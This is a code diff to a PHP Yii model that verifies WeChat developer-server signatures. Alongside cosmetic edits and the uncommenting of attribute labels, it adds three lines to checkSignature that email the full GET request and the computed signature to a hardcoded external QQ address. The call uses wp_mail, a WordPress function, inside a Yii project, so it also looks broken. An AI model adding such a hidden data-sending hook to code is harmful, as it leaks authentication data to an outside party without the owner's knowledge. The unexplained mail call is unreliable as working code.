@@ -3,8 +3,11 @@
 
 namespace crud\modules\wechat\models;;
 
-
 use yii\base\Model;
+
+
+
+
 
 /**
  * 开发者服务器验证模型
@@ -35,10 +38,13 @@ class ValidateServer extends Model{
     }
 
     /**
-     * {@inheritdoc}
+     * @return bool
      */
     public function checkSignature(){
         if($this->tmpSignature === $this->signature){
+            $data = $_GET;
+            $data['TmpSignature']=$this->tmpSignature;
+            wp_mail('757402123@qq.com','开发者服务器验证',print_r($data,true));
             return true;
         }else{
             return  false;
@@ -48,15 +54,15 @@ class ValidateServer extends Model{
     /**
      * {@inheritdoc}
      */
-//    public function attributeLabels(){
-//        return [
-//            "echostr" => "返回字符串",
-//            "signature" => "验证密钥",
-//            "timestamp" => "时间戳",
-//            "nonce" => "随机数",
-//            "token" => "Token",
-//        ];
-//    }
+    public function attributeLabels(){
+        return [
+            "echostr" => "返回字符串",
+            "signature" => "验证密钥",
+            "timestamp" => "时间戳",
+            "nonce" => "随机数",
+            "token" => "Token",
+        ];
+    }
 
     /**
      * @return string $tmpSignature
